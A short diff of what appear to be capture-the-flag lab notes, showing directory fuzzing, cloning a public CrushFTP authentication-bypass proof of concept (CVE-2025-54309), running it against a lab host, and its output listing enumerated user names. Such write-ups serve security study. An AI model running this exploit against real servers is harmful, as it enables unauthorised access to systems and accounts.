@@ -16,3 +16,12 @@ ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 313
 
 
 git clone https://github.com/watchtowrlabs/watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309.git
+
+
+
+python3 watchTowr-vs-CrushFTP-CVE-2025-54309.py  http://ftp.soulmate.htb
+============================================================
+[*] Generated new c2f value: eqNM
+[*] NEW SESSION: c2f=eqNM
+[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount
+[*] VULNERABLE! RACE CONDITION POSSIBLE!
